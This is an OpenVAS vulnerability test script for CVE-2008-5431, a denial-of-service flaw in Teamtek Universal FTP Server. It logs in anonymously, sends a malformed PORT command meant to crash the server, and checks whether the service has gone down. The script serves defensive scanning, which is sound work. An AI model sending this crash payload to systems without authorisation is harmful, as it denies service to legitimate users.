###############################################################################
# OpenVAS Vulnerability Test
#
# Teamtek Universal FTP Server Multiple Commands Denial Of Service Vulnerabilities
#
# Authors:
# Sharath S <sharaths@secpod.com>
#
# Copyright:
# Copyright (C) 2008 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.800322");
  script_version("2020-08-24T08:40:10+0000");
  script_tag(name:"last_modification", value:"2020-08-24 08:40:10 +0000 (Mon, 24 Aug 2020)");
  script_tag(name:"creation_date", value:"2008-12-16 16:12:00 +0100 (Tue, 16 Dec 2008)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_cve_id("CVE-2008-5431");
  script_bugtraq_id(27804);
  script_name("Teamtek Universal FTP Server Multiple Commands DoS Vulnerabilities");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2008 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/teamtek/universal_ftp/detected");

  script_xref(name:"URL", value:"http://secunia.com/advisories/22553");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/archive/1/488142/100/200/threaded");

  script_tag(name:"impact", value:"Successful exploitation could allows remote attackers to crash the affected
  application, denying the service to legitimate users.");

  script_tag(name:"affected", value:"Teamtek, Universal FTP Server version 1.0.50 and prior on Windows.");

  script_tag(name:"insight", value:"The flaws are exists due to run-time error while executing CWD, LIST, PORT,
  STOR, PUT and MKD commands. These commands are not properly sanitised.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"The host is running Universal FTP server and is prone to Denial of
  Service Vulnerabilities.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("ftp_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

port = ftp_get_port( default:21 );
banner = ftp_get_banner( port:port );
if( ! banner || "UNIVERSAL FTP SERVER" >!< banner )
  exit( 0 );

soc = open_sock_tcp(port);
if( ! soc ) {
  exit( 0 );
}

# Authenticate with anonymous user (Before crash)
if( ! ftp_authenticate( socket:soc, user:"anonymous", pass:"anonymous" ) ) {
  exit( 0 );
}

ftp_send_cmd( socket:soc, cmd:string("PORT AAAAAAAAAAAAAAAAA \r\n") );
sleep( 5 );
close( soc );

soc = open_sock_tcp( port );
if( ! soc ) {
  security_message( port:port );
  exit( 0 );
} else if( soc ) {
  # Re-authenticate with anonymous user (After crash)
  if( ! ftp_authenticate( socket:soc, user:"anonymous", pass:"anonymous" ) ) {
    security_message( port:port );
    exit( 0 );
  }
  close( soc );
}

exit( 99 );
